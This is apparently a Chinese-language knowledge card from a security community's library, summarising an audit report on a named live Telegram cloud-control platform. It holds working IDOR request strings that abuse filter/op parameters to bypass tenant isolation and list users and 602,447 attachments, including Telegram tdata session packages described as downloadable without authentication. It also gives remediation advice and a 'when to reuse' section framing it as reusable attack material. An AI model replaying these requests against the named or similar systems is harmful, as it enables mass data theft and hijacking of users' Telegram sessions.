# 507mx WAF 后 IDOR

- Source report: `507mx_vulnerability_report.md`
- Full report: `domains/web-attack/case-reports/507mx-waf-idor/507mx_vulnerability_report.md`
- Techniques: idor, waf
- Fused: 2026-09-17

## Key findings (distilled)

- > 本报告内容仅用于合法授权的渗透测试环境，禁止用于任何未授权场景。
- ---
- **目标系统**: https://tg.507.mx
- **系统名称**: 507出海-TG云控系统(新版) v1.0.356
- **技术框架**: ThinkPHP5 + FastAdmin Shop (app=shop_hq)
- **防护措施**: Cloudflare CDN + 自建"507安全系统"应用层 WAF
- **审计轮次**: R2
- **报告日期**: 2026-08-17
- ---
- 本次审计共发现 **12 个已确认漏洞**，严重等级分布：
- | 等级 | 数量 |
- |------|------|

## Repro snippets

```
GET /shop_hq/user/user?page=1&limit=100
    &filter=%7B%22shop_id%22%3A%220%22%7D
    &op=%7B%22shop_id%22%3A%22GT%22%7D
GET /shop_hq/attachment/index?page=N&limit=100
    &filter={"shop_id":"0"}&op={"shop_id":"GT"}
全平台附件共 **602,447 条**，其中约 9.6%（~57,800 个）为 `/uploads/ck/YYYYMMDD/{md5}.zip` 格式的 tdata 会话包，结合 507-M06 漏洞可无认证直接下载。

**修复建议**
1. 在后端 ORM 查询层强制注入当前登录账号的 `shop_id`，不允许客户端传入 filter/op 参数覆盖租户隔离条件
2. 对 filter/op 参数做严格白名单校验，仅允许 EQ（等于）运算符
3. 审计所有 FastAdmin 模块的 index 接口，统一加固 ORM 层多租户隔离

---

### 507-H01 · BFLA auth/group 权限组越权读取

**等级**: 🟠 HIGH  
**CVSS 3.1**: 7.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**状态**: confirmed_verified  
**OWASP**: API5:2023 BFLA / A01:2021 越权访问  

**漏洞描述**  
客服坐席角色（rules="268,5"
```

## When to reuse

- 同类标签命中：idor, waf
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
